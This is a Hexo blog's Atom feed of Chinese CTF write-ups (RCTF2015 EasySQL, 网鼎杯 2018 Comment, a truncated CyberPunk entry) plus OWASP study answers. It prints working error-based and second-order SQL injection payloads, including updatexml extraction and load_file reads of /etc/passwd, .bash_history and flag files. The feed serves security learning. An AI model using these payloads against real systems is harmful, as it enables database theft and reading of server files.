<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>inanb</title>
  
  <subtitle>昨夜雨疏风骤 浓睡不消残酒</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-04-25T04:40:38.395Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>inanb</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>RCTF2015-EasySQL</title>
    <link href="http://example.com/2021/04/25/RCTF2015-EasySQL/"/>
    <id>http://example.com/2021/04/25/RCTF2015-EasySQL/</id>
    <published>2021-04-25T04:05:09.000Z</published>
    <updated>2021-04-25T04:40:38.395Z</updated>
    
    <content type="html"><![CDATA[<h3 id="RCTF2015-EasySQL"><a href="#RCTF2015-EasySQL" class="headerlink" title="[RCTF2015]EasySQL"></a>[RCTF2015]EasySQL</h3><p>进入题目是一个登录页面，有注册和修改密码功能……似乎有index.phps源码，但是forbidden</p><p>发现admin已经被注册……难道可以先注入获取admin账户再得到源码进一步渗透？</p><p>注册一个<code>\</code>,在change密码时发生报错：</p><p><img src="/images/RCTF2015-EasySQL/image-20210425120947836.png" alt="image-20210425120947836"></p><p>pwd后的一串是0的md5值……</p><p>这可能是二次注入，在拿出数据时没有进行转义发生的漏洞，鉴于打印了报错信息，即可进行报错注入</p><p>类似之前的题构造，但是用户名存在过滤，首次尝试fuzz操作……</p><img src="/images/RCTF2015-EasySQL/image-20210425121328003.png" alt="image-20210425121328003" style="zoom:80%;" /><p>过滤了很多……</p><p><code>&quot;&amp;&amp;pwd=updatexml(1,concat(0x7e,(select(database())),0x7e),1)#</code>成功回显数据库名</p><p><code>&quot;&amp;&amp;pwd=updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=0x666c6167)),0x7e),1)#</code>获取表名</p><img src="/images/RCTF2015-EasySQL/image-20210425121530565.png" alt="image-20210425121530565" style="zoom:80%;" /><p>发现flag表</p><img src="/images/RCTF2015-EasySQL/image-20210425121603887.png" alt="image-20210425121603887" style="zoom:80%;" /><p>flag列</p><img src="/images/RCTF2015-EasySQL/image-20210425121624544.png" alt="image-20210425121624544" style="zoom:80%;" /><p>fakeflag……那去查查user表</p><img src="/images/RCTF2015-EasySQL/image-20210425121710797.png" alt="image-20210425121710797" style="zoom:80%;" /><p>应该是real_flag_1s_here，似乎有多行……concat</p><img src="/images/RCTF2015-EasySQL/image-20210425121803527.png" alt="image-20210425121803527" style="zoom:80%;" /><p>这样的查询表明，很多行的数据都是xxx，而flag应当在其中一行</p><blockquote><p>limit似乎用不了，很多加密也不行，mid、substr、right、left都被ban了……</p></blockquote><p>学习了正则的使用：</p><p><code>&quot;&amp;&amp;pwd=updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(select(real_flag_1s_here)regexp(&#39;^l&#39;))),0x7e),1)#</code></p><p>或</p><p><code>&quot;&amp;&amp;pwd=updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;)),0x7e),1)#</code></p><p>where(real_flag_1s_here)regexp(‘^f’)匹配real_flag_1s_here列中以f开头的那一行数据，大概是优先于group_concat的，所以也可以：</p><blockquote><p>“&amp;&amp;pwd=updatexml(1,concat(0x7e,(select(real_flag_1s_here)from(users)where(real_flag_1s_here)regexp(‘^f’)),0x7e),1)#</p></blockquote><p>怎么解决位数不足显示不全的问题呢？正则帮助我们拿出了这一行的数据，我们就可以将这行数据逆向输出</p><h4 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h4><p><code>&quot;&amp;&amp;pwd=updatexml(1,concat(0x7e,(reverse((select(real_flag_1s_here)from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;)))),0x7e),1)#</code></p><blockquote><p>XPATH syntax error: ‘~flag{4c5c3709-12d5-40af-82f2-c3’</p><p>XPATH syntax error: ‘~}8f414a13433c-2f28-fa04-5d21-90’</p><p>&lt;php？echo strrev(“}8f414a13433c-2f28-fa04-5d21-90”);</p></blockquote><p>flag{4c5c3709-12d5-40af-82f2-c33431a414f8}</p><p>获得flag……</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;RCTF2015-EasySQL&quot;&gt;&lt;a href=&quot;#RCTF2015-EasySQL&quot; class=&quot;headerlink&quot; title=&quot;[RCTF2015]EasySQL&quot;&gt;&lt;/a&gt;[RCTF2015]EasySQL&lt;/h3&gt;&lt;p&gt;进入题目是一个登录页面，</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>hacker101.1</title>
    <link href="http://example.com/2021/04/24/hacker101-1/"/>
    <id>http://example.com/2021/04/24/hacker101-1/</id>
    <published>2021-04-24T06:56:25.000Z</published>
    <updated>2021-05-06T07:39:32.063Z</updated>
    
    <content type="html"><![CDATA[<h5 id="hacker101-1"><a href="#hacker101-1" class="headerlink" title="hacker101.1"></a>hacker101.1</h5><p>2.观看视频二，回答下列问题：</p><p>视频二：<a href="https://www.hacker101.com/sessions/pentest_owasp">https://www.hacker101.com/sessions/pentest_owasp</a> </p><p>1.目前owasp的十大web安全漏洞是哪些？这些漏洞排名是按照漏洞的严重程度排序的还是按照漏洞的常见程度排序的？（2分） </p><blockquote><p><a href="https://wiki.owasp.org/images/d/dc/OWASP_Top_10_2017_%E4%B8%AD%E6%96%87%E7%89%88v1.3.pdf">中文PDF-2017</a></p><ol><li><p><strong>注入漏洞：</strong><a href="https://www.immuniweb.com/resources/owasp-top-ten/#Injection">Injection</a></p></li><li><p><strong>身份认证失效：</strong><a href="https://www.immuniweb.com/resources/owasp-top-ten/#Authentication">Broken Authentication</a></p></li><li><p><strong>敏感数据泄露：</strong><a href="https://www.immuniweb.com/resources/owasp-top-ten/#Data">Sensitive Data Exposure</a></p></li><li><p><strong>XML外部实体漏洞：</strong><a href="https://www.immuniweb.com/resources/owasp-top-ten/#XML">XML External Entities (XXE)</a></p></li><li><p><strong>访问控制失效：</strong><a href="https://www.immuniweb.com/resources/owasp-top-ten/#Access">Broken Access Control</a></p></li><li><p><strong>安全配置错误：</strong><a href="https://www.immuniweb.com/resources/owasp-top-ten/#Misconfigurations">Security Misconfigurations</a></p></li><li><p><strong>跨站脚本攻击：</strong><a href="https://www.immuniweb.com/resources/owasp-top-ten/#XSS">Cross-Site Scripting (XSS)</a></p></li><li><p><strong>不安全的反序列化：</strong><a href="https://www.immuniweb.com/resources/owasp-top-ten/#Deserialization">Insecure Deserialization</a></p></li><li><p><strong>使用含有已知漏洞的组件：</strong><a href="https://www.immuniweb.com/resources/owasp-top-ten/#Vulnerabilities">Using Components with Known Vulnerabilities</a></p></li><li><p><strong>日志和监控不足：</strong><a href="https://www.immuniweb.com/resources/owasp-top-ten/#Insufficient">Insufficient Logging and Monitoring</a></p><p><strong><em>OWASP Top 10 is a ranking of the ten most dangerous information security risks for web applications, compiled by a community of industry experts. For each point of the rating, the risk is calculated by experts based on the<a href="https://owasp.org/www-project-risk-assessment-framework/">OWASP Risk Rating Methodology</a>and includes an assessment of Weakness Prevalence, Weakness Detectability and Exploitability, as well as the criticality of the consequences of their operation or Technical Impacts.</em></strong></p><p><strong>前10大风险项是根据流行数据选择和优先排序，并结合了对可利用性、可检测性和影响程度的一致性评估而形成。</strong></p></li></ol></blockquote><p>2.请翻译一下credential stuffing（1分） </p><blockquote><p>​    <strong><em>one that’s really common from a pentesting perspective is what we call credential stuffing. And say that we go out we grab data from breached data that’s out there so an account that’s been compromised the list shows up on the internet and now, the hackers have access to usernames and passwords and say we are testing in some website.</em></strong></p><p>​    <strong><em>we just send usernames and passwords to an application ,and there’s no threat detection we’re just able to pound a login form or even use something like password spraying where we just take something like spring 2019 or summer 2020 exclamation and just throw common credentials out there and see if it sticks if we’re able to continuously brute force  an application without anything preventing us or any account lockouts.</em></strong></p><p>emm，实际上就是撞库吗……</p><p>利用已泄露的账户信息在多个平台进行尝试，这种尝试很难被检测出来。不同的用户名与密码，甚至于手机号，身份证号等等敏感信息进行组合来尝试登录。可能用户在多个平台的账户与密码是相同的，这样就十分危险。</p><p><a href="https://blog.csdn.net/weixin_44549063/article/details/113518965"><strong>Credential Stuffing Attack</strong></a></p><p><a href="https://blog.csdn.net/still_night/article/details/104837926">Beyond credential stuffing</a></p></blockquote><p>3.为什么说不充分的日志记录(insufficient logging)也算owasp十大漏洞的一种？他的危害性如何（2分） </p><blockquote><p> 之所以有很多入侵行为发生，其中原因之一是没有行为监管，或监管不充分。入侵者r进入系统然而没有日志记录这一行为，或日志记录不充分。</p><p>所以，在做一些项目时，检查日志与监控是十分重要的。不充分的日志记录与监管可能会导致很多入侵行为的发生。</p></blockquote><p>4.请翻阅一下owasp testing guide，以及owasp testing guide check-list，视频说怎么结合这两个文档来学习渗透测试？ 结合你平时渗透过程中的经验，谈谈你的感想。（3分） </p><blockquote><p><a href="https://kennel209.gitbooks.io/owasp-testing-guide-v4/content/zh/frontispiece/index.html">中文版testing-guide</a></p><p><a href="https://github.com/tanprathan/OWASP-Testing-Checklist">https://github.com/tanprathan/OWASP-Testing-Checklist</a></p><p>从testing guide中，我们可以了解到所有的不同的渗透测试一个网站应用的方法。check-list可以提供我们在测试中所有要检查的点，并为这些点提供测试工具。check-list中的测试点可拿到testing guide中检索得到更为详尽的信息与总结，search engine、operator……and step by step。</p><p>emmm，速查与教科书的关系……？渗透测试是开卷的，速查与教科书就显得十分重要……                                                                                                                               我们需要清楚应用工作的方式，熟悉测试的逻辑，而check-list和testing-guide负责帮助我们理顺逻辑并记忆基础测试点。</p><p>从思考与逻辑出发，最终落实到check-list and testing-guide。check-list and testing-guide帮助我们查漏补缺。</p></blockquote><ol start="5"><li>you are only as good as you notes   you are only as good as things you can refer to结合这两句话谈谈你的感想。（2分）</li></ol><blockquote><p>挺好……owasp提供了很好的资源，各种test-guiding，hacker101也提供了很好的学习资源（包括英语……</p><p>写博客这么长时间，感觉也确实有用。包括资料查找、记录payload、各种知识点……我们所记录的、可参考的东西是记忆可靠的延伸。</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;hacker101-1&quot;&gt;&lt;a href=&quot;#hacker101-1&quot; class=&quot;headerlink&quot; title=&quot;hacker101.1&quot;&gt;&lt;/a&gt;hacker101.1&lt;/h5&gt;&lt;p&gt;2.观看视频二，回答下列问题：&lt;/p&gt;
&lt;p&gt;视频二：&lt;a href</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>网鼎杯-2018-Comment</title>
    <link href="http://example.com/2021/04/24/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/"/>
    <id>http://example.com/2021/04/24/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/</id>
    <published>2021-04-24T06:56:25.000Z</published>
    <updated>2021-04-25T12:45:34.699Z</updated>
    
    <content type="html"><![CDATA[<h3 id="网鼎杯-2018-Comment"><a href="#网鼎杯-2018-Comment" class="headerlink" title="[网鼎杯 2018]Comment"></a>[网鼎杯 2018]Comment</h3><p>学习了不少知识…………</p><p>进入题目是一个留言板，留言需要登录，先不管……发现存在git泄露，上githack：</p><p>write_do：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;mysql.php&quot;</span>;</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;login&#x27;</span>] != <span class="string">&#x27;yes&#x27;</span>)&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ./login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;do&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">switch</span> ($_GET[<span class="string">&#x27;do&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;write&#x27;</span>:</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;comment&#x27;</span>:</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>关键这玩意没啥用啊……学习一波git恢复</p><blockquote><p>gitExtract工具似乎会自动恢复泄露文件……回去试试……</p></blockquote><h4 id="git恢复"><a href="#git恢复" class="headerlink" title="git恢复"></a>git恢复</h4><p><a href="https://www.cnblogs.com/iamstudy/articles/wangding_4th_game_web_writeup.html">https://www.cnblogs.com/iamstudy/articles/wangding_4th_game_web_writeup.html</a></p><p><a href="%5Bhttps://blog.csdn.net/edric1261234/article/details/82796506?utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control&dist_request_id=1332041.9234.16192377503140215&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control%5D(https://blog.csdn.net/edric1261234/article/details/82796506?utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control&dist_request_id=1332041.9234.16192377503140215&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control)">git reset 使用及回滚</a></p><p><a href="https://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000/0013745374151782eb658c5a5ca454eaa451661275886c6000">git的工作区和暂存区</a></p><p><a href="https://blog.csdn.net/jjlovefj/article/details/86476925">git log 详解</a></p><img src="/images/网鼎杯-2018-Comment/image-20210425204527594.png" alt="image-20210425204527594" style="zoom:80%;" /><blockquote><p>提交一个文件的时候是分为<code>git add</code>、<code>git commit</code>两步的<br>当<code>git add</code>的时候，是把文件临时放在临时区stage中<br>当<code>git commit</code>的时候，是把临时区stage的所有内容提交到当前分支<br>当然这两个在objects目录都会生成一个对象文件，来存储数据。</p><p>我们使用 git add 命令将内容写入暂存区。                                                                                                                   git commit 命令会将暂存区内容添加到本地仓库中</p></blockquote><p>这里要结合GitHacker使用，githacker似乎在获取泄露文件上能够获取到更详尽的信息。</p><blockquote><p>个人体验：GitHacker要在linux上用，需要python的requests……</p></blockquote><p>这里我们通过：git log查看commit history：</p><img src="/images/网鼎杯-2018-Comment/image-20210424151445916.png" alt="image-20210424151445916" style="zoom:80%;" /><p>git reset回滚未commit版本前已经commit的网页源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;mysql.php&quot;</span>;</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;login&#x27;</span>] != <span class="string">&#x27;yes&#x27;</span>)&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ./login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;do&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">switch</span> ($_GET[<span class="string">&#x27;do&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;write&#x27;</span>:</span><br><span class="line">    $category = addslashes($_POST[<span class="string">&#x27;category&#x27;</span>]);</span><br><span class="line">    $title = addslashes($_POST[<span class="string">&#x27;title&#x27;</span>]);</span><br><span class="line">    $content = addslashes($_POST[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    $sql = <span class="string">&quot;insert into board</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                title = &#x27;<span class="subst">$title</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;&quot;</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;comment&#x27;</span>:</span><br><span class="line">    $bo_id = addslashes($_POST[<span class="string">&#x27;bo_id&#x27;</span>]);</span><br><span class="line">    $sql = <span class="string">&quot;select category from board where id=&#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    $num = mysql_num_rows($result);</span><br><span class="line">    <span class="keyword">if</span>($num&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    $category = mysql_fetch_array($result)[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line">    $content = addslashes($_POST[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    $sql = <span class="string">&quot;insert into comment</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;,</span></span><br><span class="line"><span class="string">                bo_id = &#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    header(<span class="string">&quot;Location: ./comment.php?id=<span class="subst">$bo_id</span>&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>类似刚做过的<strong>CyberPunk</strong>，对输入做了转义，然而<code>$category = mysql_fetch_array($result)[&#39;category&#39;];</code>却直接抓取了结果，也就是说，存在二次注入。</p><h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">&quot;insert into comment</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;,</span></span><br><span class="line"><span class="string">                bo_id = &#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br></pre></td></tr></table></figure><p>这里即是关键的注入点，content会取出未转义的单引号进行闭合</p><p>关键是如何构造，这是十分关键的</p><blockquote><p>注意：这里的content是commend的content，不是帖子的content</p></blockquote><p>这里的sql语句是多行的，注释需要用多行注释：</p><p>令category=’,content=database(),/<em>，在留言中输入\</em>/#：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">&quot;insert into comment</span></span><br><span class="line"><span class="string">            set category = &#x27;&#x27;,content=database(),/*&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;*/#&#x27;,</span></span><br><span class="line"><span class="string">                bo_id = &#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br></pre></td></tr></table></figure><p>这样构造，<code>/**/</code>注释掉跨行<code>&#39;</code>，#注释掉后面的单引号，content就会成功被我们劫持，我们在留言后语句就会成功执行完成注入。</p><p>但是注库名时发现没有回显，一番尝试……放弃……</p><p>load_file读取passwd：</p><blockquote><p><a href="https://www.cnblogs.com/songxingzhu/p/6364700.html">https://www.cnblogs.com/songxingzhu/p/6364700.html</a></p></blockquote><img src="/images/网鼎杯-2018-Comment/image-20210424155009903.png" alt="image-20210424155009903" style="zoom:80%;" /><p>最下面有一个www用户，目录为/home/www，默认shell为bin/bash，由此可以查一下该用户的shell历史：</p><h4 id="bash-history"><a href="#bash-history" class="headerlink" title=".bash_history"></a>.bash_history</h4><p><a href="https://blog.csdn.net/u011479200/article/details/86501366">https://blog.csdn.net/u011479200/article/details/86501366</a></p><p><a href="https://blog.csdn.net/chinalinuxzend/article/details/1849419">命令记录.bash_history</a></p><p>查下/home/www/下的命令使用历史：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp/ </span><br><span class="line">unzip html.zip </span><br><span class="line">rm -f html.zip </span><br><span class="line">cp -r html /var/www/ </span><br><span class="line"><span class="built_in">cd</span> /var/www/html/ </span><br><span class="line">rm -f .DS_Store </span><br><span class="line">service apache2 start</span><br></pre></td></tr></table></figure><p>.DS_Store似乎是一种泄露，在网页上线前删掉了，但是/tmp/html中应该是存在的：</p><p>读取发现是乱码且显示不完整，用hex()读取：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Bud1</span><br><span class="line">strapIlbootstrapIlocblobF(������comment.phpIlocblob�(��cssIlocblobR(������flag_8946e1ff1ee3e40f.phpIlocblob�(������fontsIlocblobF�������index.phpIlocblob����jsIlocblobR�������login.phpIlocblob��������mysql.phpIlocblobF������vendorIlocblob�������write_do.phpIlocblobR������ @� @� @� @E</span><br></pre></td></tr></table></figure><p>发现flag_8946e1ff1ee3e40f.php，可以着手读flag了……</p><p>我寻思哪个目录下的flag文件应该都一样，结果不一样，必须读/var/www/html/下面的……</p><p><code>category=&#39;,content=hex(load_file(&quot;/var/www/html/flag_8946e1ff1ee3e40f.php&quot;)),/*</code></p><p>获得flag……</p><img src="/images/网鼎杯-2018-Comment/image-20210424160546854.png" alt="image-20210424160546854" style="zoom:50%;" /><p>……tql</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;网鼎杯-2018-Comment&quot;&gt;&lt;a href=&quot;#网鼎杯-2018-Comment&quot; class=&quot;headerlink&quot; title=&quot;[网鼎杯 2018]Comment&quot;&gt;&lt;/a&gt;[网鼎杯 2018]Comment&lt;/h3&gt;&lt;p&gt;学习了不少知识…………&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>CISCN2019-华北赛区-Day1-Web5-CyberPunk</title>
    <link href="http://example.com/2021/04/23/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web5-CyberPunk/"/>
    <id>http://example.com/2021/04/23/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web5-CyberPunk/</id>
    <published>2021-04-23T09:44:59.000Z</published>
    <updated>2021-04-23T11:08:00.243Z</updated>
    
    <content type="html"><![CDATA[<h3 id="CISCN2019-华北赛区-Day1-Web5-CyberPunk"><a href="#CISCN2019-华北赛区-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web5]CyberPunk"></a>[CISCN2019 华北赛区 Day1 Web5]CyberPunk</h3><img src="/images/CISCN2019-华北赛区-Day1-Web5-CyberPunk/image-20210423174538565.png" alt="image-20210423174538565" style="zoom:40%;" /><p>摸索一下，有添加订单，查找订单，删除订单，确认订单，更改订单的功能：</p><p>index、confirm、delete、search、change、config</p><p>index页面有提示：?file，用php://读取：</p><p>index.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// $file = $_GET[&quot;file&quot;];</span></span><br><span class="line">$file = (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]) ? $_GET[<span class="string">&#x27;file&#x27;</span>] : <span class="literal">null</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($file))&#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/phar|zip|bzip2|zlib|data|input|%00/i&quot;</span>,$file)) &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;no way!&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!--?file=?--&gt;</span><br></pre></td></tr></table></figure><p>其他页面都有针对sql的过滤：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$pattern = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; </span><br><span class="line">        $msg = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br></pre></td></tr></table></figure><p>我们可以发现，address(地址)没有过滤……</p><p>在添加订单功能中（confirm.php）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$re-&gt;bind_param(<span class="string">&quot;sss&quot;</span>, $user_name, $address, $phone);</span><br></pre></td></tr></table></figure><blockquote><p>bind_param：</p><p>该函数绑定了 SQL 的参数，且告诉数据库参数的值。 “sss” 参数列处理其余参数的数据类型。s 字符告诉数据库该参数为字符串。</p><p>参数有以下四种类型:</p><p>i - integer（整型）<br>d - double（双精度浮点型）<br>s - string（字符串）<br>b - BLOB（布尔值）</p></blockquote><p>这个函数的使用绑定了参数为字符串，有效防止了sql注入……</p><p>change.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">&quot;address&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">&quot;phone&quot;</span>]))</span><br><span 